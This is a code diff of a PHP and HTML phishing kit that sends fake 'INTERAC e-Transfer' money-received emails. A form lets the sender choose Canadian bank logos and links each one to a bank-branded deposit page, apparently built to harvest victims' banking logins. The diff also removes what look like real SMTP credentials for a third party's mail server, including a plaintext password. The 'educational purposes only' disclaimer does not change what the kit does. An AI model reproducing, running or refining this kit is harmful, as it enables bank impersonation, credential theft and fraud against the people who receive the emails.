@@ -7,7 +7,7 @@ require ("PHPMailer/src/PHPMailer.php");
 require ("PHPMailer/src/SMTP.php");
 require ("PHPMailer/src/Exception.php");
 
-$template = file_get_contents('Deposit.html');
+$template = file_get_contents('CancelNotice.html');
 $message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
 $message = str_replace('{{username}}', $_POST['username'], $template);
 $message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
@@ -32,7 +32,7 @@ $mail->Body = $message; // use $message instead of $template
 $mail->SMTPAuth = true; 
 $mail->Username = $_POST['username']; 
 $mail->Password = $_POST['password']; 
-$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']); 
+$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']); 
 $mail->AddAddress($_POST['receiver_email']); 
 $mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
 $mail->IsHTML(true); 
@@ -236,32 +236,35 @@ h1:focus {
 	</nav>
  <fieldset>
   <h1>e TRANS </h1>
-	<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
 
-<input type="text"   id="search"  name="receiver_email" value="swiftrynx@yopmail.com"  required>
-<input type="text"   name="receiver_name" value="One-time Contact" required>
-<input type="text"   name="sender_name" value="TRIPLE X OILFIELD LTD" required>
-<input type="text"   name="amount" placeholder="100.00" step="0.01"  required>
-<input type="text"   name="expiredate" Value=", 2023" placeholder="May 8,2023" required>
-
-
+<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
+<input type="text"   name="receiver_email" placeholder="receivers email" value="THIS IS FOR"  required>
+<input type="text"   name="receiver_name"  placeholder="receivers name"  value="EDUCATIONAL" required>
+<input type="text"   name="sender_name"    placeholder="sender name"     value="PURPOSES" required>
+<input type="text"   name="amount"         placeholder="100.00"          Value="ONLY!!!"  step="0.01"  required>
+<input type="text"   name="expiredate"     placeholder="May 8,2023"      Value="REMOVE FOR PLACEHOLDER"    required>
+<center>BY DELETING THE VALUE MEANS YOU UNDERSTAND THAT I WILL NOT BE HELD RESPONSIBLE 
+    FOR ANY ILLIGAL OR UNLAWFUL ACTIVATIES COMMITED WITH THIS TOOL.. THANK YOU
+</center>
+<!-- THESE MENUS ARE ONLY NEEDED IF YOUR USING METHOD 1 . BUT YOU NEED AN ACTIVE SMTP EMAIL ADDRESS GMAIL DONT WORK  -->
 <label for="photo_link">BANK | LOGO</label>
 <select name="photo_link" id="photo_link">
-<option value="NULL"> - SELECT A BANK - </option>   
+<option value="NULL"> - BANK LOGO - </option>   
 <option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
-<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
+<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB </option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
-<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
+<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">NBC</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
-<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
+<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
-<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
+<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
+<option value="null">- CREDIT UNIONS - </option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario CU ghg</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian CU</option>
 <option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
@@ -298,72 +301,56 @@ h1:focus {
 
 <label for="bank">BANK | NAME</label>
 <select name="bank" id="bank">
-<option value="NULL">- SELECT A BANK - </option>   
-	<option value="Scotiabank">Scotia Bank</option>
-	<option value="Bank of Montreal">Bank of Montreal</option>
-	<option value="CIBC">CIBC</option>
-	<option value="RBC Royal Bank">RBC Royal Bank</option>
-	<option value="ATB Financial">ATB Financial</option>
-	<option value="TD Canada Trust">TD Canada Trust</option>
-	<option value="HSBC Bank Canada">HSBC Bank Canada</option>
-	<option value="National Bank of Canada">National Bank of Canada</option>
-	<option value="Desjardins">Desjardins</option>
-	<option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
-	<option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
-	<option value="Tangerine Bank">Tangerine Bank</option>
-	<option value="Alterna Bank">Alterna Bank</option>
-	<option value="Bridgewater Bank">Bridgewater Bank</option>
-	<option value="Canadian Tire Bank">Canadian Tire Bank</option>
-	<option value="Equitable Bank">Equitable Bank</option>
-	<option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
-	<option value="Haventree Bank">Haventree Bank</option>
-	<option value="Motus">Motusbank</option>
-	<option value="Peoples Trust Company">Peoples Trust Company</option>
-	<option value="Simplii Financial">Simplii Financial</option>
-	<option value="Vancity">Vancity</option>
+<option value="NULL">- BANK NAME - </option>   
+<option value="ATB Financial">ATB</option>
+<option value="Bank of Montreal">BMO</option>	
+<option value="CIBC">CIBC</option>
+<option value="Desjardins">Desjardins</option>
+<option value="HSBC Bank Canada">HSBC </option>
+<option value="Scotiabank">Scotia</option>
+<option value="RBC Royal Bank">RBC</option>
+<option value="Simplii Financial">Simplii</option>
+<option value="TD Canada Trust">TD</option>
+<option value="National Bank of Canada">NBC</option>
+<option value="Laurentian Bank of Canada">Laurentian</option>
+<option value="Manulife Bank of Canada">Manulife</option>
+<option value="Motus">Motusbank</option>
+<option value="Tangerine Bank">Tangerine</option>
 </select>
 <label for="bank">BANK | LINK</label>    
 <select name="photo_href" id="photo_href">
-<option value="NULL">- SELECT A BANK - </option>   
-<option value="/public/deposit/sco/928460.php">Scotiabank</option>
-<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
-<option value="/public/deposit/bmo/928460.php">Bank of Montreal</option>
+<option value="NULL">-  BANK IMAGE  - </option> 
+<option value="/public/deposit/atb/928460.php">ATB</option>
+<option value="/public/deposit/bmo/928460.php">BMO</option>
 <option value="/public/deposit/cibc/928460.php">CIBC</option>
-<option value="/public/deposit/rbc/928460.php">RBC Royal Bank</option>
-<option value="/public/deposit/atb/928460.php">ATB Financial</option>
-<option value="/public/deposit/td/928460.php">TD Canada Trust</option>
-<option value="/public/deposit/hsbc/928460.php">HSBC Bank Canada</option>
-<option value="/public/deposit/nbc/928460.php">National Bank of Canada</option>
 <option value="/public/deposit/desj/928460.php">Desjardins</option>
-<option value="/public/deposit/laur/928460.php">Laurentian Bank of Canada</option>
-<option value="/public/deposit/manu/928460.php">Manulife Bank of Canada</option>
-<option value="/public/deposit/tang/928460.php">Tangerine Bank</option>
-<option value="/public/deposit/alterna/928460.php">Alterna Bank</option>
-<option value="/public/deposit/bridgewater/928460.php">Bridgewater Bank</option>
-<option value="/public/deposit/canadiantire/928460.php">Canadian Tire Bank</option>
-<option value="/public/deposit/equitable/928460.php">Equitable Bank</option>
-<option value="/public/deposit/firstnations/928460.php">First Nations Bank of Canada</option>
-<option value="/public/deposit/haventree/928460.php">Haventree Bank</option>
+<option value="/public/deposit/hsbc/928460.php">HSBC</option>
+<option value="/public/deposit/sco/928460.php">Scotiabank</option>
+<option value="/public/deposit/simplii/928460.php">Simplii</option>
+<option value="/public/deposit/rbc/928460.php">RBC</option>
+<option value="/public/deposit/td/928460.php">TD</option>
+<option value="/public/deposit/nbc/928460.php">NBC</option>
+<option value="/public/deposit/laur/928460.php">Laurentian</option>
+<option value="/public/deposit/manu/928460.php">Manulife</option>
 <option value="/public/deposit/motus/928460.php">Motusbank</option>
-<option value="/public/deposit/peoples-trust/928460.php">Peoples Trust Company</option>
-<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
-<option value="/public/deposit/vancity/928460.php">Vancity</option>
+<option value="/public/deposit/tang/928460.php">Tangerine </option>
       </select>
+      <!-- this is the end of the drop down menus -->
 <!DOCTYPE html>
 <html>
   <head>
   </head>
   <body>
-
     <ul>
-
     </style>
-  </select><input type="submit" value="Submit">
-
-<center>DONT EDIT THIS </center>
-<input type="hidden"       name="port"     value="587"              required>
-<input type="hidden"       name="username"   value="triplex@gpnet.ca" required>
-<input type="hidden"   name="password" value="Triplex2020!"     required>
-<input type="hidden"       name="host"     value="mail.gpnet.ca"    required>
+  </select>
+<!-- THIS IS THE SUBMIT BUTTON THAT SENDS THE FORM DATA TO PHPMAILER -->
+<input type="submit" value="Submit">
+<!-- THIS IS THE SMTP INPUT SECTION -->
+<center>ENTER YOUR SMTP INFO HERE</center>
+<input type="text"       name="port"       value="<smtp-port>"         required>
+<input type="text"       name="username"   value="<smtp@email.com>"    required>
+<input type="text"       name="password"   value="<smtp-password>"     required>
+<input type="text"       name="host"       value="<smtp-url>"          required>
 </body></html>
 
